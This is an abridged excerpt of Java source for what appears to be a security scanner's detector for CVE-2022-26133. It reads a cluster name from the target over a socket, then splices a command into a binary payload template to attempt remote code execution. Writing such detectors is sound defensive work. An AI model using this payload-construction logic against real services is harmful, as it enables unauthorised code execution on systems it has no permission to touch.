...
public final class Cve202226133Detector implements VulnDetector {
  ...
  Cve202226133Detector(
    ...
    this.payloadTemplate =
        Resources.toByteArray(Resources.getResource(this.getClass(), "payload.bin"));
  }
  ...
  private boolean isServiceVulnerable(NetworkService networkService) {
    ...
    Socket socket;
    try {
      socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      InputStream in = socket.getInputStream();
      socket.getOutputStream().write(CLUSTER_NAME_REQUEST_GARBAGE);
      clusterName = in.readAllBytes();
      socket.close();
      ...
      byte[] cmd = payload.getPayload().getBytes();

      int cmdIndex = Bytes.indexOf(this.payloadTemplate, RCE_CMD_PLACEHOLDER.getBytes());
      byte[] payloadMessage = Bytes.concat(
          clusterName, Arrays.copyOfRange(this.payloadTemplate, 0, cmdIndex), cmd,
          Arrays.copyOfRange(this.payloadTemplate, cmdIndex + cmd.length, this.payloadTemplate.length));
